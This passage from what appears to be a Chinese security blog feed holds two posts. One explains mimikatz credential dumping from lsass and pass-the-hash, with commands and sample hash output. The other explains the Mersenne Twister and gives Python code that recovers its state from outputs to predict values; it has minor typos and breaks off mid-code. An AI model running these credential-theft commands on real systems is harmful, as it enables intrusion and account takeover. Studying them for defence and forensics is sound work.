</tr>
</tbody>
</table>
<blockquote>
<p>调试权限允许某人调试他们原本无权访问的进程。例如，以用户身份运行并在其令牌上启用调试权限的进程可以调试作为本地系统运行的服务。</p>
</blockquote>
<p>如果出现
<code>ERROR kuhl_m_privilege_simple ; RtlAdjustPrivilege (20) c0000061</code>
错误，说明不是由管理员权限运行 mimikatz。</p>
<h3 id="sekurlsa"><code>sekurlsa</code></h3>
<p>该模块通过调用 lsass 进程来提取 <strong>passwords</strong>,
<strong>keys</strong>, <strong>pin codes</strong>,
<strong>tickets</strong>，但使用该模块需要满足以下其中一个条件：</p>
<ul>
<li>管理员，<code>debug</code>通过 <code>privilege::debug</code></li>
<li><code>SYSTEM</code>帐户，通过后期利用工具，计划任务，<code>psexec -s ...</code>-在这种情况下<code>debug</code>不需要特权。</li>
<li>使用 lsass 转储文件</li>
</ul>
<p>如果没有访问lsass进程的权限，所有命令都将失败，并出现如下错误：（<code>ERROR kuhl_m_sekurlsa_acquireLSA ; Handle on memory (0x00000005)</code>，使用
lsass 转储时除外）。</p>
<table>
<colgroup>
<col style="width: 22%">
<col style="width: 77%">
</colgroup>
<thead>
<tr class="header">
<th>命令</th>
<th>作用</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td><code>logonpasswords</code></td>
<td>打印出所以登陆过的账户及其明文密码</td>
</tr>
<tr class="even">
<td><code>pth</code></td>
<td>Pass-The-Hash，请查看<a href="#%60pth%60">下文</a></td>
</tr>
<tr class="odd">
<td><code>minidump</code></td>
<td>载入转储的 <code>lsass.dmp</code> 文件</td>
</tr>
<tr class="even">
<td><code>kerberos</code></td>
<td>打印在域上使用智能卡登录时，<code>lsass</code>缓存智能卡的 PIN
码</td>
</tr>
</tbody>
</table>
<h4 id="pth"><code>pth</code></h4>
<h5 id="功能">功能</h5>
<p>Pass-The-Hash，即使用<code>NTLM</code>用户密码的哈希而不是其真实密码在另一个凭据下运行进程。</p>
<p>为此，它使用假身份启动一个过程，然后<code>NTLM</code>用真实信息（<code>NTLM</code>真实密码的散列）替换假信息（假密码的散列）。</p>
<h5 id="参数">参数</h5>
<ul>
<li><code>/user</code>-
您要冒充的用户名，请记住，管理员不是这个知名帐户的唯一名称。</li>
<li><code>/domain</code>- 完全限定的域名 -
没有域或在本地用户/管理员的情况下，使用计算机或服务器名称，<code>workgroup</code>或其他。</li>
<li><code>/rc4</code>或<code>/ntlm</code>-<em>可选</em>- 用户密码的 RC4
密钥/NTLM 哈希。</li>
<li><code>/aes128</code>-<em>可选</em>- 从用户密码和域领域派生的 AES128
密钥。</li>
<li><code>/aes256</code>-<em>可选</em>- 从用户密码和域领域派生的 AES256
密钥。</li>
<li><code>/run</code>-<em>可选</em>- 要运行的命令行 -
默认为：<code>cmd</code>拥有一个 shell。</li>
</ul>
<p>在 Windows 最新版本上也有效：</p>
<ul>
<li><code>sekurlsa::pth /user:Administrateur /domain:chocolate.local /aes256:b7268361386090314acce8d9367e55f55865e7ef8e670fbe4262d6c94098a9e9</code></li>
<li><code>sekurlsa::pth /user:Administrateur /domain:chocolate.local /ntlm:cc36cf7a8514893efccd332446158b1a /aes256:b7268361386090314acce8d9367e55f55865e7ef8e670fbe4262d6c94098a9e9</code></li>
</ul>
<h5 id="注意">注意</h5>
<ul>
<li>此命令不适用于小型转储（废话）；</li>
<li>它需要提升权限（<code>privilege::debug</code>或<code>SYSTEM</code>帐户），这与使用一个官方
API 的“Pass-The-Ticket”不同；</li>
<li>这个新版本的“Pass-The-Hash”用哈希替换<code>RC4 keys</code>了
Kerberos <code>ntlm</code>（和/或替换了<code>AES</code>密钥）——它允许
Kerberos 提供者询问<code>TGT</code>票证！;</li>
<li><code>ntlm</code>哈希在 XP/2003/Vista/2008 和 7/2008r2/8/2012
之前是<strong>强制性</strong><code>kb2871997</code>的（<code>AES</code>不可用或可替换）；</li>
<li><code>AES</code>密钥只能在 8.1/2012r2 或 7/2008r2/8/2012
上替换为<code>kb2871997</code>，在这种情况下，您可以避免<code>ntlm</code>散列。</li>
</ul>
<h2 id="实例">实例</h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mimikatz <span class="comment"># sekurlsa::minidump lsass.dmp</span></span><br><span class="line">Switch to MINIDUMP : <span class="string">&#x27;lsass.dmp&#x27;</span></span><br><span class="line"></span><br><span class="line">mimikatz <span class="comment"># sekurlsa::logonpasswords</span></span><br><span class="line">Opening : <span class="string">&#x27;lsass.dmp&#x27;</span> file <span class="keyword">for</span> minidump...</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 88038 (00000000:000157e6)</span><br><span class="line">Session           : Interactive from 1</span><br><span class="line">User Name         : Gentil Kiwi</span><br><span class="line">Domain            : vm-w7-ult</span><br><span class="line">SID               : S-1-5-21-2044528444-627255920-3055224092-1000</span><br><span class="line">        msv :</span><br><span class="line">         [00000003] Primary</span><br><span class="line">         * Username : Gentil Kiwi</span><br><span class="line">         * Domain   : vm-w7-ult</span><br><span class="line">         * LM       : d0e9aee149655a6075e4540af1f22d3b</span><br><span class="line">         * NTLM     : cc36cf7a8514893efccd332446158b1a</span><br><span class="line">         * SHA1     : a299912f3dc7cf0023aef8e4361abfc03e9a8c30</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<h1 id="mimikatz-变种">mimikatz 变种</h1>
<ul>
<li>Meterpreter 有 mimikatz 插件</li>
<li>Volatility 有 mimikatz 插件</li>
<li>PowerShell 有 mimikatz 的 DLL 反射</li>
</ul>
]]></content>
      <tags>
        <tag>note</tag>
        <tag>forensics</tag>
      </tags>
  </entry>
  <entry>
    <title>Mersenne Twister 梅森旋转算法笔记</title>
    <url>//mersenne-twister-note.html</url>
    <content><![CDATA[<h1 id="梅森旋转算法简介">梅森旋转算法简介</h1>
<p>梅森旋转算法（Mersenne Twister Algorithm，简称
MT）是为了解决过去伪随机数发生器（Pseudo-Random Number Generator，简称
PRNG）产生的伪随机数质量不高而提出的新算法。该算法由松本眞（Makoto
Matsumoto）和西村拓士（Takuji Nishimura）在 1997
年提出，期间还得到了「算法之神」高德纳（Donald Ervin Knuth）的帮助。</p>
<p>Mersenne
Twister这个名字来自周期长度取自梅森质数的这样一个事实。这个算法通常使用两个相近的变体，不同之处在于使用了不同的梅森素数。一个更新的和更常用的是MT19937,
32位字长。还有一个变种是64位版的MT19937-64。对于一个<em>k</em>位的长度，Mersenne
Twister会在<span class="math inline">\([0,2^{k}-1]\)</span>的区间之间生成离散型均匀分布的随机数。</p>
<p>其是多种语言的默认随机数算法，如Python、PHP和Matlab等。同时从C++11开始，C++中可以使用
<code>std::mtl9937_64</code> 使用梅森旋转算法。</p>
<p>目前被视为是最好的随机数算法。</p>
<h1 id="算法描述">算法描述</h1>
<p>以下使用 MT19937 代替称呼梅森旋转算法。</p>
<p>MT19937 需要有一个 624 大小的 int32
数组来保存<strong>寄存器状态</strong>。</p>
<p>以下是算法步骤：</p>
<ol type="1">
<li>利用 seed 初始化寄存器状态</li>
<li>对寄存器状态进行旋转</li>
<li>根据寄存器状态提取伪随机数</li>
</ol>
<p>下面使用 python 对算法进行剖析。</p>
<h2 id="mt19937-初始化">MT19937 初始化</h2>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MT19937</span>:</span><br><span class="line">    <span class="comment"># 常量初始化</span></span><br><span class="line">    n = <span class="number">624</span></span><br><span class="line">    m = <span class="number">397</span></span><br><span class="line">    a = <span class="number">0x9908b0df</span></span><br><span class="line">    b = <span class="number">0x9d2c5680</span></span><br><span class="line">    c = <span class="number">0xefc60000</span></span><br><span class="line">    kInitOperand = <span class="number">0x6c078965</span></span><br><span class="line">    kMaxBits = <span class="number">0xffffffff</span></span><br><span class="line">    kUpperBits = <span class="number">0x80000000</span></span><br><span class="line">    kLowerBits = <span class="number">0x7fffffff</span></span><br><span class="line">    <span class="comment"># 寄存器状态</span></span><br><span class="line">    register = [<span class="number">0</span>] * n</span><br><span class="line">    <span class="comment"># 寄存器状态量</span></span><br><span class="line">    state = <span class="number">0</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 将数字变为 32 位整数</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_int32</span>(<span class="params">self, x</span>):</span><br><span class="line">        <span class="keyword">return</span> x &amp; <span class="number">0xffffffff</span></span><br></pre></td></tr></table></figure>
<h2 id="初始化寄存器状态">初始化寄存器状态</h2>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 初始化寄存器状态</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">seed</span>(<span class="params">self, seed</span>):</span><br><span class="line">    self.register[<span class="number">0</span>] = seed</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">624</span>):</span><br><span class="line">        self.register[i] = self._int32(self.kInitOperand *</span><br><span class="line">                (self.register[i-<span class="number">1</span>] ^ self.register[i-<span class="number">1</span>] &gt;&gt; <span class="number">30</span>) + i)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, seed = <span class="literal">None</span></span>):</span><br><span class="line">    <span class="keyword">if</span> seed:</span><br><span class="line">        self.seed(seed)</span><br></pre></td></tr></table></figure>
<h2 id="旋转">旋转</h2>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 旋转</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">twist</span>(<span class="params">self</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(self.n):</span><br><span class="line">        x = self._int32((self.register[i] &amp; self.kUpperBits) +</span><br><span class="line">                        (self.register[(i + <span class="number">1</span>) % self.n] &amp; self.kLowerBits))</span><br><span class="line">        self.register[i] = self.register[(i + self.m) % self.n] ^ (x &gt;&gt; <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> x &amp; <span class="number">1</span> != <span class="number">0</span>:</span><br><span class="line">            self.register[i] ^= <span class="number">0x9908b0df</span></span><br><span class="line">    self.index = <span class="number">0</span></span><br></pre></td></tr></table></figure>
<h2 id="提取伪随机数">提取伪随机数</h2>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 提取</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">extract</span>(<span class="params">self</span>):</span><br><span class="line">    <span class="keyword">if</span> self.state &gt;= self.n:</span><br><span class="line">        self.twist()</span><br><span class="line"></span><br><span class="line">    x = self.register[self.state]</span><br><span class="line">    x ^= x &gt;&gt; <span class="number">11</span></span><br><span class="line">    x ^= (x &lt;&lt; <span class="number">7</span>) &amp; self.b</span><br><span class="line">    x ^= (x &lt;&lt; <span class="number">15</span>) &amp; self.c</span><br><span class="line">    x ^= x &gt;&gt; <span class="number">18</span></span><br><span class="line"></span><br><span class="line">    self.state += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> self._int32(x)</span><br></pre></td></tr></table></figure>
<h2 id="完整代码">完整代码</h2>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MT19937</span>:</span><br><span class="line">    n = <span class="number">624</span></span><br><span class="line">    m = <span class="number">397</span></span><br><span class="line">    a = <span class="number">0x9908b0df</span></span><br><span class="line">    b = <span class="number">0x9d2c5680</span></span><br><span class="line">    c = <span class="number">0xefc60000</span></span><br><span class="line">    kInitOperand = <span class="number">0x6c078965</span></span><br><span class="line">    kMaxBits = <span class="number">0xffffffff</span></span><br><span class="line">    kUpperBits = <span class="number">0x80000000</span></span><br><span class="line">    kLowerBits = <span class="number">0x7fffffff</span></span><br><span class="line">    register = [<span class="number">0</span>] * n</span><br><span class="line">    state = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 将数字变为 32 位整数</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_int32</span>(<span class="params">self, x</span>):</span><br><span class="line">        <span class="keyword">return</span> x &amp; <span class="number">0xffffffff</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 初始化寄存器状态</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">seed</span>(<span class="params">self, seed</span>):</span><br><span class="line">        self.register[<span class="number">0</span>] = seed</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, self.n):</span><br><span class="line">            self.register[i] = self._int32(self.kInitOperand *</span><br><span class="line">                    (self.register[i-<span class="number">1</span>] ^ self.register[i-<span class="number">1</span>] &gt;&gt; <span class="number">30</span>) + i)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, seed = <span class="literal">None</span></span>):</span><br><span class="line">        <span class="keyword">if</span> seed:</span><br><span class="line">            self.seed(seed)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 旋转</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">twist</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(self.n):</span><br><span class="line">            x = self._int32((self.register[i] &amp; self.kUpperBits) +</span><br><span class="line">                            (self.register[(i + <span class="number">1</span>) % self.n] &amp; self.kLowerBits))</span><br><span class="line">            self.register[i] = self.register[(i + self.m) % self.n] ^ (x &gt;&gt; <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> x &amp; <span class="number">1</span> != <span class="number">0</span>:</span><br><span class="line">                self.register[i] ^= self.a</span><br><span class="line">        self.state = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 提取</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">extract</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">if</span> self.state &gt;= self.n:</span><br><span class="line">            self.twist()</span><br><span class="line"></span><br><span class="line">        x = self.register[self.state]</span><br><span class="line">        x ^= x &gt;&gt; <span class="number">11</span></span><br><span class="line">        x ^= (x &lt;&lt; <span class="number">7</span>) &amp; self.b</span><br><span class="line">        x ^= (x &lt;&lt; <span class="number">15</span>) &amp; self.c</span><br><span class="line">        x ^= x &gt;&gt; <span class="number">18</span></span><br><span class="line"></span><br><span class="line">        self.state += <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> self._int32(x)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__call__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> self.extract()</span><br></pre></td></tr></table></figure>
<h1 id="状态破解">状态破解</h1>
<p>梅森旋转算法的设计目的是优秀的伪随机数发生算法，而不是产生密码学上安全的随机数。从梅森旋转算法的结构上说，其提取算法
<code>extract</code>
完全基于二进制的按位异或；而二进制按位异或是可逆的，故而
<code>extract</code>
是可逆的。这就意味着，攻击者可以从梅森旋转算法的输出，逆推出产生该输出的内部寄存器状态
<code>register[state]</code>。若攻击者能够获得连续的至少
<code>n</code>个寄存器状态，那么攻击者就能预测出接下来的随机数序列。</p>
<p>以下我们用 python 对算法逐步破解</p>
<h2 id="右移位后异或逆向">右移位后异或逆向</h2>
<p>首先观察原函数。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">right_shift_xor</span>(<span class="params">value, shift</span>):</span><br><span class="line">    result = value</span><br><span class="line">    result ^= (result &gt;&gt; shift)</span><br><span class="line">    <span class="keyword">return</span> result</span><br></pre></td></tr></table></figure>
<p>简单起见，我们观察一个 8 位二进制数，右移 3 位后异或的过程。</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">value<span class="punctuation">:</span>    <span class="number">1101</span> <span class="number">0010</span></span><br><span class="line">shifted<span class="punctuation">:</span>  <span class="number">0001</span> <span class="number">1010</span> # <span class="number">010</span> (&gt;&gt; <span class="number">3</span>)</span><br><span class="line">result<span class="punctuation">:</span>   <span class="number">1100</span> <span class="number">1000</span></span><br></pre></td></tr></table></figure>
<p>首先，观察到 <code>result</code> 的最高 <code>shift</code> 位与
<code>value</code> 的最高 <code>shift</code> 位是一样的。因此，在
<code>result</code> 的基础上，我们可以将其与一个二进制遮罩取与，得到
<code>value</code> 的最高 <code>shift</code>
位。这个遮罩应该是：<code>1111 1111 &lt;&lt; (8 - 3) = 1110 0000</code>。于是我们得到
<code>1100 0000</code>。</p>
<p>其次，注意到对于异或运算有如下事实：<code>a ^ b ^ b = a</code>。依靠二进制遮罩，我们已经获得了
<code>value</code> 的最高 <code>shift</code> 位。因此，我们也就能得到
<code>shifted</code> 的最高 <code>2 * shift</code> 位。它应该是
<code>1100 0000 &gt;&gt; 3 = 0001 1000</code>。将其与
<code>result</code> 取异或，则能得到 <code>value</code> 的最高
<code>2 * shift</code> 位。于是我们得到 <code>1101 0000</code>。</p>
<p>故我们可以逆向出代码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">unshiftRight</span>(<span class="params">self, x, shift</span>):</span><br><span class="line">    res = x</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">        res = x ^ res &gt;&gt; shift</span><br><span class="line">    <span class="keyword">return</span> res</span><br></pre></td></tr></table></figure>
<h2 id="左移位后异或逆向">左移位后异或逆向</h2>
<p>同理可得代码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">unshiftLeft</span>(<span class="params">self, x, shift, mask</span>):</span><br><span class="line">    res = x</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">        res = x ^ (res &lt;&lt; shift &amp; mask)</span><br><span class="line">    <span class="keyword">return</span> res</span><br></pre></td></tr></table></figure>
<h2 id="提取伪随机数逆向">提取伪随机数逆向</h2>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">b = <span class="number">0x9d2c5680</span></span><br><span class="line">c = <span class="number">0xefc60000</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">untemper</span>(<span class="params">self, v</span>):</span><br><span class="line">    v = self.unshiftRight(v, <span class="number">18</span>)</span><br><span class="line">    v = self.unshiftLeft(v, <span class="number">15</span>, self.c)</span><br><span class="line">    v = self.unshiftLeft(v, <span class="number">7</span>, self.b)</span><br><span class="line">    v = self.unshiftRight(v, <span class="number">11</span>)</span><br><span class="line">    <span class="keyword">return</span> v</span><br></pre></td></tr></table></figure>
<h2 id="通过输出参数逆向">通过输出参数逆向</h2>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># forward 表示是否需要回到目前状态</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">go</span>(<span class="params">self, outputs, forward=<span class="literal">True</span></span>):</span><br><span class="line">    <span class="comment"># 还原的寄存器状态</span></span><br><span class="line">    result_state = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 至少需要 624 个寄存器状态</span></span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(outputs) &gt;= <span class="number">624</span></span><br><span class="line"></span><br><span class="line">    ivals = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">624</span>):</span><br><span class="line">        ivals.append(self.untemper(outputs[i]))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(outputs) &gt;= <span class="number">625</span>:</span><br><span class="line">        <span class="comment"># 此时可以使用后面的数据进行验证</span></span><br><span class="line">        challenge = outputs[<span class="number">624</span>]</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">626</span>):</span><br><span class="line">            state = (<span class="number">3</span>, <span class="built_in">tuple</span>(ivals+[i]), <span class="literal">None</span>)</span><br><span class="line">            r = random.Random()</span><br><span class="line">            r.setstate(state)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> challenge == r.getrandbits(<span class="number">32</span>):</span><br><span class="line">                result_state = state</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="comment"># 如果刚好是 624 个寄存器状态</span></span><br><span class="line">        result_state = (<span class="number">3</span>, <span class="built_in">tuple</span>(ivals+[<span class="number">624</span>]), <span class="literal">None</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 利用 python 自带的 mt19937 random 库</span></span><br><span class="line">    rand = random.Random()</span><br><span class="line">    rand.setstate(result_state)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 如果需要到输出后的状态，则进行比较判断</span></span><br><span class="line">    <span class="keyword">if</span> forward:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">624</span>, <span class="built_in">len</span>(outputs)):</span><br><span class="line">            <span class="keyword">assert</span> rand.getrandbits(<span class="number">32</span>) == outputs[i]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> rand</span><br></pre></td></tr></table></figure>
<h2 id="完整代码-1">完整代码</h2>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MT19937Recover</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">unshiftRight</span>(<span class="params">self, x, shift</span>):</span><br><span class="line">        res = x</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">            res = x ^ res &gt;&gt; shift</span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">unshiftLeft</span>(<span class="params">self, x, shift, mask</span>):</span><br><span class="line">        res = x</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">            res = x ^ (res &lt;&lt; shift &amp; mask)</span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">untemper</span>(<span class="params">self, v</span>):</span><br><span class="line">        v = self.unshiftRight(v, <span class="number">18</span>)</span><br><span class="line">        v = self.unshiftLeft(v, <span class="number">15</span>, <span class="number">0xefc60000</span>)</span><br><span class="line">        v = self.unshiftLeft(v, <span class="number">7</span>, <span class="number">0x9d2c5680</span>)</span><br><span class="line">        v = self.unshiftRight(v, <span class="number">11</span>)</span><br><span class="line">        <span class="keyword">return</span> v</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">go</span>(<span class="params">self, outputs, forward=<span class="literal">True</span></span>):</span><br><span class="line">        result_state = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">assert</span> <span class="built_in">len</span>(outputs) &gt;= <span class="number">624</span></span><br><span class="line"></span><br><span class="line">        ivals = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">624</span>):</span><br><span class="line">            ivals.append(self.untemper(outputs[i]))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(outputs) &gt;= <span class="number">625</span>:</span><br><span class="line">            challenge = outputs[<span class="number">624</span>]</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">626</span>):</span><br><span class="line">                state = (<span class="number">3</span>, <span class="built_in">tuple</span>(ivals+[i]), <span class="literal">None</span>)</span><br><span class="line">                r = random.Random()</span><br><span class="line">                r.setstate(state)</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> challenge == r.getrandbits(<span class="number">32</span>):</span><br><span class="line">                    result_state = state</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            result_state = (<span class="number">3</span>, <span class="built_in">tuple</span>(ivals+[<span class="number">624</span>]), <span class="literal">None</span>)</span><br><span class="line"></span><br><span class="line">        rand = random.Random()</span><br><span class="line">        rand.setstate(result_state)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> forward:</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">624</span>, <span class="built_in">len</span>(outputs)):</span><br><span class="line">                <span class="keyword">assert</span> rand.getrandbits(<span class="number">32</span>) == outputs[i]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> rand</span><br><span class="line"></span><br><span class="line">mtc = MT19937Recover()</span><br></pre></td></tr></table></figure>
<h2 id="现有框架">现有框架</h2>
<p>我们可以使用 Python 的 randcrack 模块破解梅森随机数，这是用来破解
Python 随机数的模块。</p>
<h1 id="矩阵状态破解">矩阵状态破解</h1>
<p>我们对 <code>extract_number</code> 函数进行分析，设
<code>state[i]</code> 的二进制表示形式为 <span class="math display">\[
x_0x_1\cdots x_{30}x_{31}
\]</span> 那么输出的随机数的二进制表示形式为 <span class="math display">\[
z_0z_1\cdots z_{30}z_{31}
\]</span> 那么可以发现它们存在如下线性关系 <span class="math display">\[
\begin{array}{l}
z_{0}=x_{0} \oplus x_{4} \oplus x_{7} \oplus x_{15} \\
z_{1}=x_{1} \oplus x_{5} \oplus x_{16} \\
z_{2}=x_{2} \oplus x_{6} \oplus x_{13} \oplus x_{17} \oplus x_{24} \\
z_{3}=x_{3} \oplus x_{10} \\
z_{4}=x_{0} \oplus x_{4} \oplus x_{8} \oplus x_{11} \oplus x_{15} \oplus
x_{19} \oplus x_{26} \\
z_{5}=x_{1} \oplus x_{5} \oplus x_{9} \oplus x_{12} \oplus x_{20} \\
z_{6}=x_{6} \oplus x_{10} \oplus x_{17} \oplus x_{21} \oplus x_{28} \\
z_{7}=x_{3} \oplus x_{7} \oplus x_{11} \oplus x_{14} \oplus x_{18}
\oplus x_{22} \oplus x_{29} \\
z_{8}=x_{8} \oplus x_{12} \oplus x_{23} \\
z_{9}=x_{9} \oplus x_{13} \oplus x_{20} \oplus x_{24} \oplus x_{31} \\
z_{10}=x_{6} \oplus x_{10} \oplus x_{17} \\
z_{11}=x_{0} \oplus x_{11} \\
z_{12}=x_{1} \oplus x_{8} \oplus x_{12} \oplus x_{19} \\
z_{13}=x_{2} \oplus x_{9} \oplus x_{13} \oplus x_{17} \oplus x_{20}
\oplus x_{28} \\
z_{14}=x_{3} \oplus x_{14} \oplus x_{18} \oplus x_{29} \\
z_{15}=x_{4} \oplus x_{15} \\
z_{16}=x_{5} \oplus x_{16} \\
z_{17}=x_{6} \oplus x_{13} \oplus x_{17} \oplus x_{24} \\
z_{18}=x_{0} \oplus x_{4} \oplus x_{15} \oplus x_{18} \\
z_{19}=x_{1} \oplus x_{5} \oplus x_{8} \oplus x_{15} \oplus x_{16}
\oplus x_{19} \oplus x_{26} \\
z_{20}=x_{2} \oplus x_{6} \oplus x_{9} \oplus x_{13} \oplus x_{17}
\oplus x_{20} \oplus x_{24} \\
z_{21}=x_{3} \oplus x_{17} \oplus x_{21} \oplus x_{28} \\
z_{22}=x_{0} \oplus x_{4} \oplus x_{8} \oplus x_{15} \oplus x_{18}
\oplus x_{19} \oplus x_{22} \oplus x_{26} \oplus x_{29} \\
z_{23}=x_{1} \oplus x_{5} \oplus x_{9} \oplus x_{20} \oplus x_{23} \\
z_{24}=x_{6} \oplus x_{10} \oplus x_{13} \oplus x_{17} \oplus x_{20}
\oplus x_{21} \oplus x_{24} \oplus x_{28} \oplus x_{31} \\
z_{25}=x_{3} \oplus x_{7} \oplus x_{11} \oplus x_{18} \oplus x_{22}
\oplus x_{25} \oplus x_{29} \\
z_{26}=x_{8} \oplus x_{12} \oplus x_{15} \oplus x_{23} \oplus x_{26} \\
z_{27}=x_{9} \oplus x_{13} \oplus x_{16} \oplus x_{20} \oplus x_{24}
\oplus x_{27} \oplus x_{31} \\
z_{28}=x_{6} \oplus x_{10} \oplus x_{28} \\
z_{29}=x_{0} \oplus x_{11} \oplus x_{18} \oplus x_{29} \\
z_{30}=x_{1} \oplus x_{8} \oplus x_{12} \oplus x_{30} \\
z_{31}=x_{2} \oplus x_{9} \oplus x_{13} \oplus x_{17} \oplus x_{28}
\oplus x_{31}
\end{array}
\]</span> 也就是说，存在一个 <span class="math inline">\(\mathrm{GF}(2)\)</span> 的矩阵可以将 <span class="math inline">\(X\)</span> 变化为 <span class="math inline">\(Z\)</span>，即 <span class="math display">\[
XT=Z
\]</span> 我们可以采用黑盒测试的方式计算出 <span class="math inline">\(T\)</span>，例如当 <span class="math inline">\(X=(1,0,\cdots,0)\)</span> 时，得到矩阵 <span class="math inline">\(T\)</span> 的第一行。</p>
<p>使用 sagemath 编写代码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">extract_number</span>(<span class="params">x</span>):</span><br><span class="line">    x ^^= x &gt;&gt; <span class="number">11</span></span><br><span class="line">    x ^^= (x &lt;&lt; <span class="number">7</span>) &amp; <span class="number">2636928640</span></span><br><span class="line">    x ^^= (x &lt;&lt; <span class="number">15</span>) &amp; <span class="number">4022730752</span></span><br><span class="line">    x ^^= x &gt;&gt; <span class="number">18</span></span><br><span class="line">    <span class="keyword">return</span> x &amp; <span class="number">0xffffffff</span></span><br><span class="line"></span><br><span class="line">T = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">    x = <span class="number">1</span> &lt;&lt; (<span class="number">31</span> - i)</span><br><span class="line">    x = extract_number(x)</span><br><span class="line">    T.append(x.digits(<span class="number">2</span>, padto=<span 